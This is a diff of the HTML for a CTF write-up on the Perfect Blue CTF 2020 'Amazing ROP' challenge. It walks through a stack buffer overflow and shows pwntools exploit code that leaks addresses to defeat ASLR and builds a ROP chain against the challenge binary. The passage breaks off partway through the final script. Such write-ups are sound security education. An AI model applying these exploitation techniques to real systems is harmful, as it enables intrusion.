@@ -1,121 +1,4 @@
-<!DOCTYPE html>
-<html lang="en-us">
-
-<head>
-<meta charset="utf-8" />
-<meta name="author" content="" />
-<meta name="description" content="" />
-<meta name="keywords" content="" />
-<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.76.2" />
-
-<link rel="canonical" href="https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/">
-<meta property="og:title" content="Perfect Blue CTF 2020: Amazing ROP" />
-<meta property="og:description" content="Should be a baby ROP challenge. Just need to follow directions and get first flag." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/" />
-<meta property="article:published_time" content="2020-12-07T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-12-07T00:00:00+00:00" />
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Perfect Blue CTF 2020: Amazing ROP"/>
-<meta name="twitter:description" content="Should be a baby ROP challenge. Just need to follow directions and get first flag."/>
-
-
-<meta itemprop="name" content="Perfect Blue CTF 2020: Amazing ROP">
-<meta itemprop="description" content="Should be a baby ROP challenge. Just need to follow directions and get first flag.">
-<meta itemprop="datePublished" content="2020-12-07T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2020-12-07T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1371">
-
-
-
-<meta itemprop="keywords" content="exploitation," />
-
-
-<link rel="stylesheet" href="/css/layout.css" />
-
-
-<link rel="stylesheet" href="/css/default-dark.css" />
-
-
-<link rel="stylesheet" href="/css/adoc-html5-extension.css" />
-
-
-
-<title>
-
-
-     Perfect Blue CTF 2020: Amazing ROP 
-
-</title>
-
-</head>
-
-
-<body>
-<div class="main">
-<header>
-
-<div class="header-bar">
-
-  <nav>
-    <div class="siteTitle">
-      <a href="https://starfleetcadet75.github.io/">starfleetcadet75</a>
-    </div> 
-
-    
-    
-    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
-    
-    <a class="nav-item" href="/readinglist/"><div class="nav-item-title">Reading List</div></a>
-    
-    <a class="nav-item active" href="/posts/"><div class="nav-item-title">Posts</div></a>
-    
-
-  </nav>
-
-  
-<div class="social-links-header" style="visibility:hidden; display:none;">
-
-  
-  <a href="mailto:starfleetcadet75@gmail.com"><div class="social-link">email</div></a>
-  
-
-  
-  <a href="https://github.com/starfleetcadet75" target="_blank"><div class="social-link">gh</div></a>
-  
-
-  
-  <a href="https://gitlab.com/starfleetcadet75" target="_blank"><div class="social-link">gl</div></a>
-  
-
-  
-
-  
-
-</div>
-
-
-</div>
-
-
-</header>
-
-
-<article class="post">
-    <h1 class="title"> Perfect Blue CTF 2020: Amazing ROP </h1>
-    <div class="content"> <p><strong>Category:</strong> Binary Exploitation<br>
-<strong>Points:</strong> 87</p>
-<h2 id="challenge">Challenge</h2>
-<blockquote>
-<p>Should be a baby ROP challenge. Just need to follow directions and get first flag.<br>
-maze.chal.perfect.blue:1<br>
-<a href="https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.bin">bof.bin</a> <a href="https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.c">bof.c</a></p>
-</blockquote>
-<h2 id="smash-the-stack">Smash the Stack</h2>
-<p>We are provided with a 32-bit program without stack canaries but with position independant code and the stack set to non-executable.</p>
-<pre><code class="language-none" data-lang="none">$ checksec ./bof.bin
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content><meta name=description content><meta name=keywords content><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.84.4"><link rel=canonical href=https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/><meta property="og:title" content="Perfect Blue CTF 2020: Amazing ROP"><meta property="og:description" content="Should be a baby ROP challenge. Just need to follow directions and get first flag."><meta property="og:type" content="article"><meta property="og:url" content="https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-07T00:00:00+00:00"><meta property="article:modified_time" content="2020-12-07T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Perfect Blue CTF 2020: Amazing ROP"><meta name=twitter:description content="Should be a baby ROP challenge. Just need to follow directions and get first flag."><meta itemprop=name content="Perfect Blue CTF 2020: Amazing ROP"><meta itemprop=description content="Should be a baby ROP challenge. Just need to follow directions and get first flag."><meta itemprop=datePublished content="2020-12-07T00:00:00+00:00"><meta itemprop=dateModified content="2020-12-07T00:00:00+00:00"><meta itemprop=wordCount content="1371"><meta itemprop=keywords content="exploitation,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=stylesheet href=/css/adoc-html5-extension.css><title>Perfect Blue CTF 2020: Amazing ROP</title></head><body><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=https://starfleetcadet75.github.io/>starfleetcadet75</a></div><a class=nav-item href=/about/><div class=nav-item-title>About</div></a><a class=nav-item href=/readinglist/><div class=nav-item-title>Reading List</div></a><a class="nav-item active" href=/posts/><div class=nav-item-title>Posts</div></a></nav><div class=social-links-header style=visibility:hidden;display:none><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>gh</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>gl</div></a></div></div></header><article class=post><h1 class=title>Perfect Blue CTF 2020: Amazing ROP</h1><div class=content><p><strong>Category:</strong> Binary Exploitation<br><strong>Points:</strong> 87</p><h2 id=challenge>Challenge</h2><blockquote><p>Should be a baby ROP challenge. Just need to follow directions and get first flag.<br>maze.chal.perfect.blue:1<br><a href=https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.bin>bof.bin</a> <a href=https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.c>bof.c</a></p></blockquote><h2 id=smash-the-stack>Smash the Stack</h2><p>We are provided with a 32-bit program without stack canaries but with position independant code and the stack set to non-executable.</p><pre><code class=language-none data-lang=none>$ checksec ./bof.bin
 [*] '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin'
     Arch:     i386-32-little
     RELRO:    Full RELRO
@@ -123,8 +6,7 @@ maze.chal.perfect.blue:1<br>
     NX:       NX enabled
     PIE:      PIE enabled
 </code></pre><p>The provided program crashes immediately after prompting the user to select the visualization mode.
-By running the program with strace we discover that it is failing to open a file called &ldquo;passwds&rdquo;.</p>
-<pre><code class="language-none" data-lang="none">$ strace ./bof.bin 
+By running the program with strace we discover that it is failing to open a file called &ldquo;passwds&rdquo;.</p><pre><code class=language-none data-lang=none>$ strace ./bof.bin 
 execve(&quot;./bof.bin&quot;, [&quot;./bof.bin&quot;], 0x7ffd52282c20 /* 57 vars */) = 0
 strace: [ Process PID=17412 runs in 32 bit mode. ]
 brk(NULL)                               = 0x57acf000
@@ -140,54 +22,49 @@ stat64(&quot;mazes/1.lvl&quot;, 0xfff333fc)       = -1 ENOENT (No such file or d
 +++ killed by SIGSEGV (core dumped) +++
 Segmentation fault (core dumped)
 </code></pre><p>Creating a &ldquo;passwds&rdquo; file with some random content allows us to run the program correctly.
-It provides a nice visualization of the stack contents both before and after the user input is entered.</p>
-<p><img src="https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/userinput.png" alt="userinput"></p>
-<p>The program highlights the location of the secret in the stack and indicates that it is looking for a specific value.
-The value should be the string &ldquo;flag&rdquo; according to the source code.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// Check if secret has changed.
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (secret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x67616c66</span>) {  <span style="color:#75715e">// &#34;flag&#34;
-</span><span style="color:#75715e"></span>    puts(<span style="color:#e6db74">&#34;You did it! Congratuations!&#34;</span>);
-    <span style="color:#75715e">// print_flag(); // Print out the flag. You deserve it. (not anymore)
-</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;Returning to address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#f92672">&amp;</span>secret)[<span style="color:#ae81ff">4</span>]);
-    <span style="color:#66d9ef">return</span>;
+It provides a nice visualization of the stack contents both before and after the user input is entered.</p><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/userinput.png alt=userinput></p><p>The program highlights the location of the secret in the stack and indicates that it is looking for a specific value.
+The value should be the string &ldquo;flag&rdquo; according to the source code.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// Check if secret has changed.
+</span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (secret <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x67616c66</span>) {  <span style=color:#75715e>// &#34;flag&#34;
+</span><span style=color:#75715e></span>    puts(<span style=color:#e6db74>&#34;You did it! Congratuations!&#34;</span>);
+    <span style=color:#75715e>// print_flag(); // Print out the flag. You deserve it. (not anymore)
+</span><span style=color:#75715e></span>    printf(<span style=color:#e6db74>&#34;Returning to address: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#f92672>&amp;</span>secret)[<span style=color:#ae81ff>4</span>]);
+    <span style=color:#66d9ef>return</span>;
 }
-<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (secret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
-    puts(<span style="color:#e6db74">&#34;Wow you overflowed the secret value! Now try controlling the value of it!&#34;</span>);
+<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (secret <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0xdeadbeef</span>) {
+    puts(<span style=color:#e6db74>&#34;Wow you overflowed the secret value! Now try controlling the value of it!&#34;</span>);
 }
-<span style="color:#66d9ef">else</span> {
-    puts(<span style="color:#e6db74">&#34;Maybe you haven&#39;t overflowed enough characters? Try again?&#34;</span>);
+<span style=color:#66d9ef>else</span> {
+    puts(<span style=color:#e6db74>&#34;Maybe you haven&#39;t overflowed enough characters? Try again?&#34;</span>);
 }
-</code></pre></div><p>It took 48 bytes to reach the location of the secret value so we can write out an initial exploit skeleton to trigger the correct code path.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+</code></pre></div><p>It took 48 bytes to reach the location of the secret value so we can write out an initial exploit skeleton to trigger the correct code path.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
 
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
-exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof.bin&#34;</span>)
-context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./bof.bin&#34;</span>)
+context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
-    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
-        <span style="color:#66d9ef">return</span> process(exe<span style="color:#f92672">.</span>path)
-    <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#34;maze.chal.perfect.blue&#34;</span>, <span style="color:#ae81ff">1</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+        <span style=color:#66d9ef>return</span> process(exe<span style=color:#f92672>.</span>path)
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#34;maze.chal.perfect.blue&#34;</span>, <span style=color:#ae81ff>1</span>)
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    r <span style="color:#f92672">=</span> conn()
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>clean())
-    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;n&#34;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    r <span style=color:#f92672>=</span> conn()
+    print(r<span style=color:#f92672>.</span>clean())
+    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;n&#34;</span>)
 
-    <span style="color:#75715e"># Write &#34;flag&#34; to the required location</span>
-    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>
-    buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x67616c66</span>)
+    <span style=color:#75715e># Write &#34;flag&#34; to the required location</span>
+    buf <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>48</span>
+    buf <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x67616c66</span>)
 
-    r<span style="color:#f92672">.</span>sendline(buf)
-    r<span style="color:#f92672">.</span>interactive()
+    r<span style=color:#f92672>.</span>sendline(buf)
+    r<span style=color:#f92672>.</span>interactive()
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
     main()
 </code></pre></div><p>The program prints a congratulations message and the return address but then exits.
-To gain control of the instruction pointer we simply need to add 12 additional junk bytes after the secret value followed by our desired return address.</p>
-<pre><code class="language-none" data-lang="none">[+] Starting local process '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin': pid 17616
+To gain control of the instruction pointer we simply need to add 12 additional junk bytes after the secret value followed by our desired return address.</p><pre><code class=language-none data-lang=none>[+] Starting local process '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin': pid 17616
 b'Do you want color in the visualization? (Y/n) '
 [*] Switching to interactive mode
 [*] Process '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin' stopped with exit code 0 (pid 17616)
@@ -216,188 +93,95 @@ Input some text:
 You did it! Congratuations!
 Returning to address: 0x56595599
 [*] Got EOF while reading in interactive
-</code></pre><h2 id="building-the-rop-chain">Building the ROP Chain</h2>
-<p>The comment at the top of the source code tells us that in order to get the flag we must put the correct values into the EAX, EDI, and ESI registers and then trigger a breakpoint instruction.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// This is what you need to do to get the first flag
-</span><span style="color:#75715e">// void print_flag() {
-</span><span style="color:#75715e">//   asm volatile(&#34;mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3&#34; ::: &#34;eax&#34;);
-</span><span style="color:#75715e">// }
+</code></pre><h2 id=building-the-rop-chain>Building the ROP Chain</h2><p>The comment at the top of the source code tells us that in order to get the flag we must put the correct values into the EAX, EDI, and ESI registers and then trigger a breakpoint instruction.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// This is what you need to do to get the first flag
+</span><span style=color:#75715e>// void print_flag() {
+</span><span style=color:#75715e>//   asm volatile(&#34;mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3&#34; ::: &#34;eax&#34;);
+</span><span style=color:#75715e>// }
 </span></code></pre></div><p>Since ASLR is enabled, we need to use an information leak to determine what the program&rsquo;s base address is at runtime.
-The stack visualization that gets printed prior to reading in user input is perfect since our script can parse it to determine the base address and then rebase all of the ROP gadget addresses.</p>
-<p>As for the gadgets themselves, we can easily locate a gadget to move arbitrary values from our input into the EDI and ESI registers with <code>pop esi; pop edi; pop ebp; ret</code>.
-The breakpoint instruction is simply the single byte 0xcc.</p>
-<p>The tricky gadget to find and use is the <code>mov eax, 0x1</code>.
-ROPgadget produces only one promising result: <code>mov eax, 1 ; jmp 0x1427</code>.</p>
-<p>If we look back at the source code, we can see one obvious place in the <code>prompt</code> function where EAX will get set to the value 1.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">prompt</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>prompt, <span style="color:#66d9ef">int</span> def) {
-    <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">32</span>];
+The stack visualization that gets printed prior to reading in user input is perfect since our script can parse it to determine the base address and then rebase all of the ROP gadget addresses.</p><p>As for the gadgets themselves, we can easily locate a gadget to move arbitrary values from our input into the EDI and ESI registers with <code>pop esi; pop edi; pop ebp; ret</code>.
+The breakpoint instruction is simply the single byte 0xcc.</p><p>The tricky gadget to find and use is the <code>mov eax, 0x1</code>.
+ROPgadget produces only one promising result: <code>mov eax, 1 ; jmp 0x1427</code>.</p><p>If we look back at the source code, we can see one obvious place in the <code>prompt</code> function where EAX will get set to the value 1.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>prompt</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>prompt, <span style=color:#66d9ef>int</span> def) {
+    <span style=color:#66d9ef>char</span> buff[<span style=color:#ae81ff>32</span>];
 
-    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, prompt);
-    fgets(buff, <span style="color:#66d9ef">sizeof</span>(buff), stdin);
-    <span style="color:#66d9ef">if</span> (buff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span> <span style="color:#f92672">||</span> buff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>)
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">// Set EAX = 1
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;N&#39;</span> <span style="color:#f92672">||</span> buff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span>)
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    <span style="color:#66d9ef">else</span>
-        <span style="color:#66d9ef">return</span> def;
+    printf(<span style=color:#e6db74>&#34;%s&#34;</span>, prompt);
+    fgets(buff, <span style=color:#66d9ef>sizeof</span>(buff), stdin);
+    <span style=color:#66d9ef>if</span> (buff[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;Y&#39;</span> <span style=color:#f92672>||</span> buff[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;y&#39;</span>)
+        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;  <span style=color:#75715e>// Set EAX = 1
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (buff[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;N&#39;</span> <span style=color:#f92672>||</span> buff[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;n&#39;</span>)
+        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+    <span style=color:#66d9ef>else</span>
+        <span style=color:#66d9ef>return</span> def;
 }
 </code></pre></div><p>The gadget we found is part of the instructions for this particular return statement.
-If we look at the output from objdump we can see that the jump instruction is followed by a meaningless memory read, a <code>leave</code> instruction, and then it reaches a return.</p>
-<p><img src="https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/objdump.png" alt="objdump"></p>
-<p>This gadget will work, we just need to fiddle with our junk values to ensure that the <code>leave</code> instruction doesn&rsquo;t segfault.
+If we look at the output from objdump we can see that the jump instruction is followed by a meaningless memory read, a <code>leave</code> instruction, and then it reaches a return.</p><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/objdump.png alt=objdump></p><p>This gadget will work, we just need to fiddle with our junk values to ensure that the <code>leave</code> instruction doesn&rsquo;t segfault.
 The <code>leave</code> instruction is essentially the same as the sequence <code>mov esp, ebp; pop ebp</code>.
-This means that it will set ESP to some value that we overwrote with junk in our shellcode.</p>
-<p>To fix this problem, we once again use the stack visualization as a leak to save the original value of EBP before it gets trashed.
-The saved EBP address is put in the ROP chain following the gadget so that the <code>leave</code> instruction can execute correctly.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+This means that it will set ESP to some value that we overwrote with junk in our shellcode.</p><p>To fix this problem, we once again use the stack visualization as a leak to save the original value of EBP before it gets trashed.
+The saved EBP address is put in the ROP chain following the gadget so that the <code>leave</code> instruction can execute correctly.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
 
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
-exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof.bin&#34;</span>)
-context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./bof.bin&#34;</span>)
+context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
-    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
-        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(exe<span style="color:#f92672">.</span>path)
-    <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#34;maze.chal.perfect.blue&#34;</span>, <span style="color:#ae81ff">1</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug(exe<span style=color:#f92672>.</span>path)
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#34;maze.chal.perfect.blue&#34;</span>, <span style=color:#ae81ff>1</span>)
 
-pop3ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000396</span>  <span style="color:#75715e"># pop esi; pop edi; pop ebp; ret</span>
-moveax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000401</span>  <span style="color:#75715e"># mov eax,0x1; jmp 1422; mov ebx,DWORD PTR [ebp-0x4]; leave; ret</span>
-int3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000760</span>  <span style="color:#75715e"># cc</span>
+pop3ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000396</span>  <span style=color:#75715e># pop esi; pop edi; pop ebp; ret</span>
+moveax <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000401</span>  <span style=color:#75715e># mov eax,0x1; jmp 1422; mov ebx,DWORD PTR [ebp-0x4]; leave; ret</span>
+int3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000760</span>  <span style=color:#75715e># cc</span>
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    r <span style="color:#f92672">=</span> conn()
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>clean())
-    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;n&#34;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    r <span style=color:#f92672>=</span> conn()
+    print(r<span style=color:#f92672>.</span>clean())
+    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;n&#34;</span>)
 
-    <span style="color:#75715e"># Get the base address from the leak</span>
-    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input&#34;</span>)
-    line <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
-    values <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;|&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split()
-    retaddress <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">0</span>]
-    retaddress <span style="color:#f92672">=</span> int(retaddress, <span style="color:#ae81ff">16</span>)
-    baseaddr <span style="color:#f92672">=</span> retaddress <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x599</span>
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Base address is: &#34;</span> <span style="color:#f92672">+</span> str(hex(baseaddr)))
+    <span style=color:#75715e># Get the base address from the leak</span>
+    leak <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Input&#34;</span>)
+    line <span style=color:#f92672>=</span> leak<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>]
+    values <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;|&#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>split()
+    retaddress <span style=color:#f92672>=</span> values[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>0</span>]
+    retaddress <span style=color:#f92672>=</span> int(retaddress, <span style=color:#ae81ff>16</span>)
+    baseaddr <span style=color:#f92672>=</span> retaddress <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x599</span>
+    print(<span style=color:#e6db74>&#34;Base address is: &#34;</span> <span style=color:#f92672>+</span> str(hex(baseaddr)))
 
-    <span style="color:#75715e"># Get the value for ebp from the leak</span>
-    line <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]
-    values <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;|&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split()
-    ebpaddress <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> values[<span style="color:#ae81ff">4</span>]
-    ebpaddress <span style="color:#f92672">=</span> int(ebpaddress, <span style="color:#ae81ff">16</span>)
+    <span style=color:#75715e># Get the value for ebp from the leak</span>
+    line <span style=color:#f92672>=</span> leak<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>]
+    values <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;|&#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>split()
